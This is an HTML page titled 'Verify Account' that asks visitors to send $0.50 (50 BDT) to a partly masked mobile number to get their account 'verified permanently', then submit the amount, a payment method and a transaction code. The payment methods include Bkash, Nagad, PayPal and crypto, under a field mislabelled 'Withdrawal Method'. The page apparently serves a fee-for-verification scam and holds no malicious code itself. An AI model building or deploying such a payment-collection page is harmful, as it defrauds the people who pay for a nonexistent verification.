<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="CONTENT-TYPE" content="text/html; charset=UTF-8">
    <title>Verify Account</title>
    <style>
        /* Reset default browser styles */
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            padding: 20px;
        }

        h2 {
            text-align: center;
            margin-bottom: 20px;
            color: #333;
        }

        #verify {
            max-width: 500px;
            margin: 0 auto;
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }

        form {
            display: grid;
            gap: 10px;
        }

        label {
            font-weight: bold;
        }

        input[type="number"], select, textarea {
            width: 100%;
            padding: 8px;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box;
        }

        button[type="submit"] {
            width: 100%;
            padding: 10px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }

        button[type="submit"]:hover {
            background-color: #45a049;
        }

        #message {
            margin-top: 20px;
            text-align: center;
            font-weight: bold;
            color: #333;
        }
    </style>
</head>
<body>
    <h2>Please send $0.50 to get your account verified permanently</h2>
    <form id="verify">
        <h1>Send Money To 01*******22 and fill the form</h1>
        <label for="amount">Enter Amount:</label>
        <input type="number" id="amount" name="amount" placeholder="$0.50  BDT:50à§³" required>
        <label for="method">Select Withdrawal Method:</label>
        <select id="method" name="method" required>
            <option value="">Select Method</option>
            <option value="paypal">PayPal</option>
            <option value="Bkash">Bkash</option>
            <option value="Nagad">Nagad</option>
            <option value="bank">Bank Transfer</option>
            <option value="crypto">Crypto Wallet</option>
        </select>
        <label for="details">Enter Details:</label>
        <textarea id="details" name="details" rows="4" placeholder="Enter your trx code" required></textarea>
        <button type="submit">Verify</button>
    </form>
    <div id="message"></div>
    <script src="veri.js"></script>
</body>
</html>
